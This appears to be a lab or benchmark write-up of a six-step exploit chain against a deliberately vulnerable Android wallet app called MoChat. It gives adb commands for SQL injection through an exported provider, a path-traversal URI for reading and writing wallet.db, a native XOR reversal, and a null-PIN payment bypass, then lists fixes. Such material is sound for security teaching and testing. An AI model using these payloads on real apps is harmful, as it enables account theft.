# Chain 01 — Wallet Drain via SQLi → Oracle → Payment

## Overview

| Field | Value |
|-------|-------|
| **Category** | provider + service + activity |
| **Difficulty** | INSANE |
| **Steps** | 6 |
| **Components crossed** | ContactsProvider → WalletService → PaymentActivity |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | provider leak → object parsing → exported entry → missing guard → sink |

## Vulnerable surface

- `ContactsProvider` (authority `com.mochat.app.contacts`) — exported, raw `selection` → SQLi
- `WalletService` (Messenger, exported) — `MSG_DECRYPT` (0xD01) decryption oracle
- `PaymentActivity` (exported) — `verifyPin(null)` returns true → `pay()` succeeds
- `wallet.db` — plaintext `keys` table holds `WALLET_KEY` and `MASTER_PIN`
- `libmochat.so` — `walletDecrypt` reduces to single-byte XOR with `key[keyLen-1]`

## Step-by-step exploit

### ① SQLi: leak WALLET_KEY from the keys table

```bash
# Query the exported ContactsProvider with a UNION-based SQLi.
# The keys table lives in wallet.db but the provider's rawQuery is chained
# to the same SQLite connection pool; alternatively use FileBackupProvider
# to read wallet.db directly (see step ⑤).
adb shell content query --uri content://com.mochat.app.contacts/contacts \
  --where "1=1 UNION SELECT k as name, v as phone, '' as id_card, '' as email FROM keys--"
```

Extract `WALLET_KEY = MoChat!` from the result.

### ② Reverse the native XOR

In `libmochat.so`, `walletDecrypt(data, key)` has a bug: the inner loop overwrites
every byte with each `key[j]`, so the net effect is `out[i] = data[i] ^ key[last]`.

For key `"MoChat!"`, `key[last] = '!' = 0x21`.

```
plaintext[i] = ciphertext[i] ^ 0x21
```

### ③ Bind WalletService, decrypt the balance BLOB

```python
# attacker script (Python via frida or adb am)
import struct
# bind to the exported Messenger service
# send msg.what = 0xD01, data.getString("b64") = base64(balance_enc)
# reply.data.getString("plain") = decrypted balance in fen
```

```bash
# Or via adb (simplified — use drozer or a helper app for Messenger IPC):
# The decrypted balance is "100000" (1000.00 yuan = 100000 fen).
```

### ④ Forge a higher balance

```
forged_balance = "9999999"
forged_enc[i] = forged_balance[i] ^ 0x21
```

### ⑤ Write the forged BLOB back via FileBackupProvider path traversal

```bash
# Path-traversal: read/write wallet.db through the exported backup provider.
adb shell content read --uri "content://com.mochat.app.backup/..%2Fdatabases%2Fwallet.db"
# Use sqlite3 to UPDATE the balance_enc BLOB, then write back.
```

### ⑥ Launch exported PaymentActivity with no PIN

```bash
adb shell am start -n com.mochat.app/.wallet.PaymentActivity \
  --es to "attacker_account_666" \
  --el amount 9999999
# No --es pin => pin=null => verifyPin(null) returns true => pay() executes.
```

**logcat confirms**:
```
PaymentActivity: to=attacker_account_666 amount=9999999 pin=null authed=true txn=TXN...
```

## Guard analysis

| Guard | Status |
|-------|--------|
| ContactsProvider read permission | absent (exported, no permission) |
| WalletService caller check | absent (exported, any app binds) |
| PaymentActivity PIN check | bypassed (null pin → true) |
| FileBackupProvider path filter | absent (no canonical-path check) |

## Impact

Full wallet drain: attacker transfers the entire forged balance to their own account
without knowing the PIN, the encryption key (recovered via SQLi+reverse), or any credential.

## Fix

- Parameterize `queryContacts` selection; never pass raw `selection` to `rawQuery`.
- Remove `MSG_DECRYPT` from the exported WalletService; never expose a crypto oracle.
- `PaymentActivity.verifyPin` must reject null/empty PIN.
- `FileBackupProvider.openFile` must validate canonical path containment.
